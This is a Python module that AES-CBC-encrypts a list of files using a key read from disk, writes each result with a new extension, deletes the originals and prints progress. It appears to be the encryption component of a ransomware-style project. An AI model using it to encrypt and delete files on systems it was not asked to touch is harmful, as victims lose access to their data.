from Crypto.Cipher import AES
from Crypto import Random
import os
from settings import ENC_EXT, KEYS_DIR, AES_KEY


def encryptAES(files):
    print(f'\n[+] Encrypting {len(files)} files')
    with open(f'{KEYS_DIR}/{AES_KEY}', mode='rb') as p:
        key = p.read().decode('utf-8')

    key = bytearray.fromhex(key)

    for file in files:
        encrypt_file(key, file)
        os.remove(file)
        print(f'[+] {file} -> {file + ENC_EXT}')


def encrypt_file(key, filename):
    chunksize = 64*1024
    outputFile = filename + ENC_EXT
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:  # rb means read in binary
        with open(outputFile, 'wb') as outfile:  # wb means write in the binary mode
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' '*(16-(len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))
